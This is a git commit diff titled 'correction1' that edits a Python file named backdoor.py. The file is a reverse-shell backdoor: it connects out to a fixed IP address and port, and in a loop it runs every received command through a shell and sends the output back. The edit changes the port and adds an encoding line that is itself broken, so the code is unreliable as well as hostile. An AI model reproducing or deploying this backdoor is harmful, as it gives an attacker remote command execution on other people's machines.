91350e981568ea038789918a1bc7fb15ba7c4a9d
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-12 10:02:55 -0400

    correction1

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -6,12 +6,12 @@ def execute_commands(command):
     return subprocess.check_output(command,shell=True)
 
 connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-connection.connect(("192.168.1.7",4444))
+connection.connect(("192.168.1.7",1234))
 
 
 while(True):
     command = connection.recv(1024).decode('ascii')
-    command_result = execute_commands(command)
-    connection.send(command_result)
+    command_result = execute_commands(str(command))
+    connection.send(command_result).encode('ascii')
 
 connection.close()
